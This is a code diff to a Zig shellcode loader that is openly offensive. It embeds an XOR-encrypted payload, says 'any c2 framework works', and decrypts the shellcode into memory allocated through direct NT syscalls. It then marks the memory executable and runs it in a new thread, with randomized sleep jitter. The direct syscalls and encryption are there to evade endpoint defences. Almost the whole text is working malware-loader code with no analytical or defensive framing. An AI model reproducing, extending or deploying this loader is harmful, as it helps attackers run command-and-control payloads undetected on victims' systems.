@@ -23,16 +23,8 @@ fn err(comptime fmt: []const u8, args: anytype) void {
     print("[-] " ++ fmt ++ "\n", args);
 }
 
-// paste your shellcode bytes here. any c2 framework works.
-// encrypted at comptime with the per-build xor key from build.zig.
-const shellcode = init: {
-    const raw = [_]u8{
-        // Paste your shellcode bytes here.
-    };
-    var encoded: [raw.len]u8 = undefined;
-    for (&raw, 0..) |b, i| encoded[i] = b ^ key_bytes[i % key_bytes.len];
-    break :init encoded;
-};
+// per-build XOR-encrypted payload from build.zig. drop payload.bin in src/.
+const shellcode = @embedFile("payload_enc.bin");
 
 fn banner() void {
     print(
@@ -66,12 +58,12 @@ pub fn main() void {
         g_sys.NtAllocateVirtualMemory.number,
         &[_]usize{
             @intFromPtr(current_process), @intFromPtr(&base_addr), 0,
-            @intFromPtr(&size), windows.MEM_COMMIT | windows.MEM_RESERVE, windows.PAGE_READWRITE,
+            @intFromPtr(&size), nt.MEM_COMMIT | nt.MEM_RESERVE, nt.PAGE_READWRITE,
         },
         6,
     ))));
     if (!nt.NT_SUCCESS(status)) {
-        err("NtAllocateVirtualMemory failed: 0x{X}", .{@as(u32, @bitCast(status))});
+        err("NtAllocateVirtualMemory failed: 0x{X}", .{@intFromEnum(status)});
         return;
     }
     ok("allocated {d} bytes at 0x{X}", .{ size, @intFromPtr(base_addr) });
@@ -79,7 +71,7 @@ pub fn main() void {
 
     // copy encrypted shellcode and decrypt in-place.
     const buffer: [*]u8 = @ptrCast(base_addr);
-    @memcpy(buffer[0..shellcode.len], &shellcode);
+    @memcpy(buffer[0..shellcode.len], shellcode);
     for (buffer[0..shellcode.len], 0..) |*b, i| b.* ^= key_bytes[i % key_bytes.len];
     info("shellcode decrypted ({d} bytes, {d}-byte XOR key)", .{ shellcode.len, key_bytes.len });
     jitter(10, 30);
@@ -90,7 +82,7 @@ pub fn main() void {
         g_sys.NtProtectVirtualMemory.number,
         &[_]usize{
             @intFromPtr(current_process), @intFromPtr(&base_addr),
-            @intFromPtr(&size), windows.PAGE_EXECUTE_READ, @intFromPtr(&old_protect),
+            @intFromPtr(&size), nt.PAGE_EXECUTE_READ, @intFromPtr(&old_protect),
         },
         5,
     );
@@ -102,8 +94,8 @@ pub fn main() void {
     _ = syscall.syscall_dispatch(
         g_sys.NtCreateThreadEx.number,
         &[_]usize{
-            @intFromPtr(&thread_handle), windows.THREAD_ALL_ACCESS, 0,
-            @intFromPtr(current_process), @intFromPtr(@intFromPtr(base_addr)), 0,
+            @intFromPtr(&thread_handle), nt.THREAD_ALL_ACCESS, 0,
+            @intFromPtr(current_process), @intFromPtr(base_addr), 0,
             0, 0, 0, 0, 0,
         },
         11,
@@ -119,12 +111,10 @@ pub fn main() void {
 
 // pseudorandom sleep between stages. not crypto, just noise.
 fn jitter(min_ms: u64, max_ms: u64) void {
-    var interval = windows.LARGE_INTEGER{
-        .QuadPart = -@as(i64, @intCast(min_ms * 10000 + (@as(u64, @intFromPtr(&min_ms)) % ((max_ms - min_ms + 1) * 10000)))),
-    };
+    const delay: i64 = -@as(i64, @intCast(min_ms * 10000 + (@as(u64, @intFromPtr(&min_ms)) % ((max_ms - min_ms + 1) * 10000))));
     _ = syscall.syscall_dispatch(
         g_sys.NtDelayExecution.number,
-        &[_]usize{ 0, @intFromPtr(&interval) },
+        &[_]usize{ 0, @intFromPtr(&delay) },
         2,
     );
 }
